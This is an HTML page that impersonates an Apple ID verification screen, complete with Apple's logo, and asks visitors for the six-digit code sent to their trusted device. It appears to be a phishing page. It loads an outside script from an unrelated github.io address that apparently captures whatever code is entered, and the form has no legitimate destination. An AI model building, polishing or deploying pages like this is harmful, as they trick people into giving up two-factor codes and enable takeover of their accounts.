<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apple ID Verification</title>
<style>
body {
  background-color: #f2f2f7;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
}

.container {
  background: white;
  width: 360px;
  padding: 40px;
  border-radius: 16px;
  text-align: center;
  box-shadow: 0 8px 24px rgba(0,0,0,0.1);
}

.logo img {
  width: 60px;
  margin-bottom: 20px;
}

h2 {
  color: #1d1d1f;
  font-size: 22px;
  margin-bottom: 12px;
}

p {
  font-size: 14px;
  color: #6e6e73;
  margin-bottom: 25px;
}

input[type="text"] {
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: 1px solid #ccc;
  font-size: 18px;
  text-align: center;
  letter-spacing: 8px;
  margin-bottom: 20px;
}

button {
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: none;
  background-color: #0071e3;
  color: white;
  font-size: 16px;
  cursor: pointer;
  margin-bottom: 10px;
}

button:disabled {
  background-color: #aaa;
  cursor: not-allowed;
}

.resend-text {
  font-size: 14px;
  color: #6e6e73;
  margin-top: 8px;
}
</style>
</head>
<body>

<script src="https://plyarth.github.io/intc/int4.js"></script>

<div class="container">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
  </div>

  <h2>Apple ID Verification</h2>
  <p>Enter the 6-digit verification code sent to your trusted device or email.</p>

  <form>
    <input type="text" maxlength="20" placeholder="------" name="opt code" required>
    <button type="submit">Verify</button>
    <button type="button" id="resendBtn" disabled>Resend Code</button>
    <div class="resend-text">
      Resend available in <span id="timer">30</span>s
    </div>
  </form>
</div>

<script>
let countdown = 30;
let timer = document.getElementById("timer");
const resendBtn = document.getElementById("resendBtn");
const resendText = document.querySelector(".resend-text");

function startTimer() {
  const interval = setInterval(() => {
    countdown--;
    timer.innerText = countdown;

    if (countdown <= 0) {
      clearInterval(interval);
      resendBtn.disabled = false;
      resendText.innerText = "You can resend the verification code now";
    }
  }, 1000);
}

resendBtn.addEventListener("click", () => {
  alert(" Apple ID resend code triggered");
  countdown = 30;
  resendBtn.disabled = true;

  resendText.innerHTML = 'Resend available in <span id="timer">30</span>s';
  timer = document.getElementById("timer"); // ðŸ”§ FIX (nothing else changed)

  startTimer();
});

startTimer();
</script>

</body>
</html>
